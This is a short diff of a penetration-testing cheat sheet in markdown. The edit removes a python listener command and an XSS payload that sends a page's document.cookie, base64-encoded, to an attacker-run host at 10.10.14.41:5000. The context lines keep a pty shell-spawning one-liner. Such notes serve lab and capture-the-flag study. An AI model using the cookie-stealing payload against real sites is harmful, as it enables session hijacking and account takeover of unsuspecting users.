@@ -78,9 +78,9 @@ Show connected and listening sockets `netstat -an` (-n shows numberical port)
 - Spawn a bash shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
 ### Web Server Listener
-- Start a simple python web server to listen for connections: `python -m http.server 5000`'
+
 
 
 
 ## XSS Payloads
-- Img: `<script>var i=new Image(); i.src="http://10.10.14.41:5000/?cookie="+btoa(document.cookie); </script>`
+- Img: 
